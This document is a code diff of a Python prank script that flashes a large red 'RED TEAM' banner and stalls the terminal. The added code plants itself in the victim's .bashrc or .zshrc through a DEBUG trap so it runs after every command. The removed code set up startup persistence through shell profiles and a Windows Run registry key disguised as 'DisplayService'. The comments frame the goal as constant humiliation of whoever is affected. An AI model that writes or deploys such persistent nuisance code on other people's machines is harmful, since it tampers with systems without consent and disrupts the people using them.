@@ -1,65 +1,58 @@
 #!/usr/bin/env python3
-# redteam_echo.py - "RED TEAM" flashes after EVERY command
-# No freeze, just constant humiliation
+# redteam_after_every_command.py
+# Shows RED TEAM banner right after EVERY command (no freeze, just shame)
 
 import os
 import sys
+import time
 import subprocess
-import platform
 
-SCRIPT = os.path.abspath(__file__)
+SCRIPT     = os.path.abspath(__file__)
 DELAY_FILE = os.path.expanduser("~/.rt_delay")
-DEFAULT_DELAY = 4  # seconds to show banner in seconds
+DEFAULT    = 3  # seconds to display banner after each command
 
 def get_delay():
     try:
         return max(1, int(open(DELAY_FILE).read().strip()))
     except:
-        return DEFAULT_DELAY
+        return DEFAULT
 
-RED_TEAM = """
+BANNER = """
 \033[91m
 ██████╗ ███████╗██████╗     ████████╗███████╗ █████╗ ███╗   ███╗
 ██╔══██╗██╔════╝██╔══██╗    ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║
-██████╔╝█████╗  ██║  ██║       ██║   █████╗  ███████║██╔████╔██║
-██╔══██╗██╔══╝  ██║  ██║       ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║
+██████╔╝█████╗  ██████╔╝       ██║   █████╗  ███████║██╔████╔██║
+██╔══██╗██╔══╝  ██╔══██╗       ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║
 ██║  ██║███████╗██████╔╝       ██║   ███████╗██║  ██║██║ ╚═╝ ██║
 ╚═╝  ╚═╝╚══════╝╚═════╝        ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝
 \033[0m
 """
 
-def install():
-    # Linux: add to every shell profile
-    cmd = f'python3 "{SCRIPT}"\n'
-    for rc in ["~/.bashrc", "~/.zshrc", "~/.profile"]:
-        rc = os.path.expanduser(rc)
-        if os.path.exists(rc):
-            with open(rc, "a") as f:
-                f.write(f"\n# Red Team was here\n{cmd}")
-            break
-    # Windows: registry
-    if os.name == "nt":
-        try:
-            import winreg as reg
-            key = reg.OpenKey(reg.HKEY_CURRENT_USER,
-                r"Software\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_SET_VALUE)
-            pythonw = sys.executable.replace("python.exe", "pythonw.exe")
-            if not os.path.exists(pythonw): pythonw = sys.executable
-            reg.SetValueEx(key, "DisplayService", 0, reg.REG_SZ, f'"{pythonw}" "{SCRIPT}"')
-            reg.CloseKey(key)
-        except: pass
-
 def show_banner():
-    os.system("clear" if os.name != "nt" else "cls")
-    print(RED_TEAM.center(120))
+    time.sleep(0.1)  # tiny pause so command output appears first
+    print(BANNER.center(120))
     time.sleep(get_delay())
+    print()  # clean line after
+
+def install():
+    cmd = f'python3 "{SCRIPT}" postexec\n'
+    profiles = ["~/.bashrc", "~/.zshrc"]
+    for p in profiles:
+        path = os.path.expanduser(p)
+        if os.path.exists(path):
+            with open(path, "a") as f:
+                f.write(f'\nfunction __rt_hook {{ python3 "{SCRIPT}" postexec; }}\n')
+                f.write('trap \'__rt_hook\' DEBUG\n')
+            break
 
 if __name__ == "__main__":
-    if len(sys.argv) > 1 and sys.argv[1] == "--setup":
-        install()
-        print("[+] Red Team now haunts every command forever")
-        sys.exit(0)
-
-    # This is the magic: we run from .bashrc
-    import time
-    show_banner()
+    if len(sys.argv) > 1:
+        if sys.argv[1] == "--setup":
+            install()
+            print("[+] Red Team now appears after EVERY command")
+            sys.exit(0)
+        elif sys.argv[1] == "postexec":
+            show_banner()
+            sys.exit(0)
+    else:
+        show_banner()
